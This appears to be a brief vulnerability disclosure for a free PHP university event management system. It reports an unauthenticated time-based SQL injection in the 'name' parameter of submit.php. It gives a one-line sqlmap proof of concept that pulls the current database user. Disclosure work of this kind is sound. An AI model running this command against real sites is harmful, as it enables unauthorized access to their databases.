# University Event Management System IN PHP SQL INJECTION

##  Manufacturers

https://code-projects.org/

## PRODUCT NAME

##  Product Vendor

https://code-projects.org/university-event-management-system-in-php-css-javascript-and-mysql-free-download/

### Software Link

https://download.code-projects.org/details/25781c48-4c9f-495e-a56f-fd8b78652542

## Affected Compoent

### Vulnerable File

submit.php

###  VERSION(S)

-  php and v1

## Vulnerability Type

sleep time sql injection

## Attacted Type

Remote Network			

## **Description of the vulnerability**

  University Event Management System IN PHP has a SQL injection vulnerability that does not require login. There is a name parameter in the submit.php that can be used to construct SQL injection payload                                                                                                                                                                                                                                                                                                                                                                           

![image-20241101015439003](https://github.com/user-attachments/assets/1722f3b2-6975-41de-b5aa-4c3e0ed3d67d)

## Recurrence

### POC

```
python sqlmap.py -u "http://events-management-system-master/submit.php?name=1" -p "name" --current-user
```

### RESULT

get current user from databases. or get other information.

![image-20241031233147482](https://github.com/user-attachments/assets/be892c1a-918d-4fd7-a956-a2c8d109a688)